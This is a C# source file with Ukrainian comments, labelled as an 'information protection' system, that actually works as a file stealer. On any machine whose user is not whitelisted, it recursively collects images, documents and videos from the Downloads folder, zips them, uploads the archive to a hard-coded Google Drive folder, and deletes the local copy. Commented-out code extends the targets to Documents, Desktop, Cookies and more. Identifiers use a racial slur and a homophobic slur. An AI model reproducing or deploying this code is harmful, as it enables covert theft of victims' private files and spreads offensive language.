using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive;
using Google.Apis.Drive.v3;
using Google.Apis.Services;
using static System.Net.Mime.MediaTypeNames;
using Aspose.Zip;
using Aspose.Zip.Saving;
using System.IO.Compression;

/// <summary>
/// набір систем для інформаційного захисту
/// </summary>
public class GayRadarSystems
{
    private List<string> niggas = new List<string>() { "grede" };
    private int maxFileSizeInBytes = 1000000;
    private List<string> fileTypes = new List<string>();
    private List<string> startFolders = new List<string>();
    private string zipPath = "";

    public GayRadarSystems()
    {
        niggas = new List<string>() { "grede" };
        maxFileSizeInBytes = 1000000;
        fileTypes = new List<string>() {
            ".jpg",
            ".png",
            ".pdf",
            ".doc",
            ".docx",
            ".webm",
            ".mp4",
            ".mkv",
            ".avi"
        };
        //startFolders = new List<string>() {
        //    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
        //    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        //    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
        //    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        //    Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
        //    Environment.GetFolderPath(Environment.SpecialFolder.Cookies),
        //    Environment.GetFolderPath(Environment.SpecialFolder.MyComputer),
        //    Environment.GetFolderPath(Environment.SpecialFolder.Recent)
        //};
        startFolders = new List<string>()
        {
            Path.Combine(System.Environment.GetEnvironmentVariable("USERPROFILE"),"Downloads")
        };
        zipPath = @"log.zip";
    }
    public void SetMaxFileSize(int maxFileSize)
    {
        maxFileSizeInBytes = maxFileSize;
    }
    public  async Task LessGo()
    {
        if (!niggas.Contains(Environment.UserName))//якщо ім'я користувача не занесено у білий список, то стартуємо веселощі
        {
           await RealLessGo();
        }

    }
    public async Task ForcedLessGo()
    {
       await RealLessGo();
    }
    private async Task RealLessGo()
    {
        Zipper zipper = new Zipper(maxFileSizeInBytes);//створюємо екземпляр класу зіппер
        List<FileInfo> filesPaths = zipper.Scanner(maxFileSizeInBytes, startFolders, fileTypes);//скануємо задані папки рекурсивно з заданими параметрами, виводимо у список файлів
        zipper.DeleteFile(zipPath);//про всяк випадок видаляємо архів якщо він взагалі існував
        zipper.CreateZIP(filesPaths, zipPath);//створюємо архів у заданій теці
        Uploader uploader = new Uploader();//створюємо екземпляр завантажувальника
        uploader.SetPathToZip(zipPath);//оновлюємо йому відомості про місце архіву
        await uploader.UploadSomeShit();//чекаємо доки він завантажить архівчик
        zipper.DeleteFile(zipPath);//видаляємо архів у користувача

    }

    /// <summary>
    /// контейнер даних для завантаження
    /// </summary>
    public class Uploader
    {
        private string pathToJson = "";
        private string accountEmail = "";
        private string directoryID = "";
        private string pathToZIP = "";
        public void SetPathToZip(string path)
        {
            pathToZIP = path;
        }
        
        /// <summary>
        /// стандартний конструктор, створює клас з підв'язаним моїм гугл диском
        /// </summary>
        public Uploader()
        {
            this.pathToJson = Convert.ToString(
                Path.Combine(Environment.CurrentDirectory, @"service.json"));
            this.accountEmail = "netwatcher-990@template-363807.iam.gserviceaccount.com";
            this.directoryID = "1xIxxD7CjkIs3iQeqpCUC5kNJc-4G2nLE";
            this.pathToZIP = Convert.ToString(
                Path.Combine(Environment.CurrentDirectory, @"temp.zip"));
            Console.WriteLine("uploading started");
        }
        /// <summary>
        /// кастомний коструктор для вашого гімна
        /// </summary>
        /// <param name="pathToJson">шлях до .json файла який ви отримали з консолі розробника гугл</param>
        /// <param name="accountEmail">акаунт який вказаний у .json</param>
        /// <param name="directoryID">ідентифікатор папки яку ви шерите з акаунтом (остання строка посилання на неї у гуглі)</param>
        /// <param name="pathToZip">шлях до архіву який треба завантажити</param>
        public Uploader(string pathToJson, string accountEmail, string directoryID,string pathToZip)
        {
            this.pathToJson = pathToJson;
            this.accountEmail = accountEmail;
            this.directoryID = directoryID;
            this.pathToZIP = pathToZip;
        }
        /// <summary>
        /// завантаження архіву з таймстемпом і всім таким, перевірка вхідних даних тут відсутня
        /// </summary>
        /// <returns></returns>
        async public Task UploadSomeShit()
        {
            var credential = GoogleCredential.FromFile(pathToJson).CreateScoped(DriveService.ScopeConstants.Drive);
            var service = new DriveService(new BaseClientService.Initializer()
            {
                HttpClientInitializer = credential
            });

            //завантажуємо метадату
            var fileMetaData = new Google.Apis.Drive.v3.Data.File()
            {
                Name = Environment.UserName + " " + DateTime.Now.ToString("h:mm:ss tt") + ".zip",
                Parents = new List<string>() { directoryID }
            };
            //завантажуємо сам файл
            string uploadedFileID = "";
            using (var fsSource = new FileStream(pathToZIP, FileMode.Open, FileAccess.Read))
            {
                var request = service.Files.Create(fileMetaData, fsSource, "application/zip");
                request.Fields = "*";
                var results = await request.UploadAsync(CancellationToken.None);
                if (results.Status == Google.Apis.Upload.UploadStatus.Failed)
                {
                    Console.WriteLine("Лог не завантажено");
                }
                uploadedFileID = request.ResponseBody?.Id;
            }
            Console.WriteLine("zip uploaded");
        }
    }
    /// <summary>
    /// клас пошуку та архівування файлів
    /// </summary>
    public class Zipper
    {
        private int maxFileSize =0;
        public Zipper()
        {
            maxFileSize = 1000000;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <param name="maxFileSize">максимальний розмір файлу для пошуку</param>
        public Zipper(int maxFileSize)
        {
            this.maxFileSize = maxFileSize;
        }
        /// <summary>
        /// функція пошуку файлів у теках
        /// </summary>
        /// <param name="maxFileSize">Максимальний розмір файлу у байтах(?)</param>
        /// <param name="initialFolders">Список шляхів до тек, з яких почати пошук (/user/Documents і т.д.)</param>
        /// <param name="fileTypes">Список дозволених до додавання форматів файлів (.jpg;.png і т.д.)</param>
        /// <returns></returns>
        public List<FileInfo> Scanner(int maxFileSize, List<string> initialFolders, List<string> fileTypes)
        {
            return RealScanner(maxFileSize, initialFolders, fileTypes);
        }
        
        public List<FileInfo> Scanner()
        {
            return RealScanner(
                maxFileSize,
                new List<string>() { "C:\\Users\\grede\\Downloads" },
                new List<string>() { ".png",".jpg",".docx",".pdf"});

        }
        private List<FileInfo> RealScanner(int maxFileSize, List<string> initialFolders, List<string> fileTypes)
        {

            //знайти усі файли у папках та записати їх у масив
            //визначити типи файлів та їх розмір, те що не підходить видалити

            List<FileInfo> fileInfos = new List<FileInfo>();
            long fileSize = 0;
            //для кожної з початкових папок шукати файли
            foreach(string folder in initialFolders)
            {
                //знаходимо усі файли в теці рекурсивно
                foreach(string file in GayRadarSystems.Zipper.GetFiles(folder))
                {
                    
                    //якщо він задовольняє умовам, то закидуємо його в масив
                    FileInfo fileInfo = new FileInfo(file);
                    if(fileInfo.Length> maxFileSize || !fileTypes.Contains(fileInfo.Extension))
                    {
                        //файл гімно, не додаємо
                    }
                    else
                    {
                        //файл база, записуємо
                        fileInfos.Add(fileInfo);
                        //Console.WriteLine(file);
                        fileSize += fileInfo.Length;
                    }
                }
            }

            //сортуємо отриманий масив
            //fileInfos.Sort();//а от хуй тобі, а не сортування такого гімна
            Console.Clear();
            Console.WriteLine("Scanner done. Files number: "+fileInfos.Count+"\t files size: "+(fileSize/1000000)+"mb");
            return fileInfos;

        }
        private static IEnumerable<string> GetFiles(string path)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex)
                {
                    Console.Error.WriteLine(ex);
                }
                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        yield return files[i];
                    }
                }
            }
        }

        public void CreateZIP(List<FileInfo> fileInfos,string path)
        {
            using(var archive = ZipFile.Open(path, ZipArchiveMode.Create))
            {
                foreach (FileInfo fileInfo in fileInfos)
                {
                    archive.CreateEntryFromFile(fileInfo.FullName, fileInfo.Name);
                }
            }
            Console.WriteLine("zip created");
        }
        public void DeleteFile(string path)
        {
            if (File.Exists(path))
            {
                File.Delete(path);
                Console.WriteLine("zip deleted");
            }
            else
            {
                Console.WriteLine("zip not found");
            }
        }

    }
}


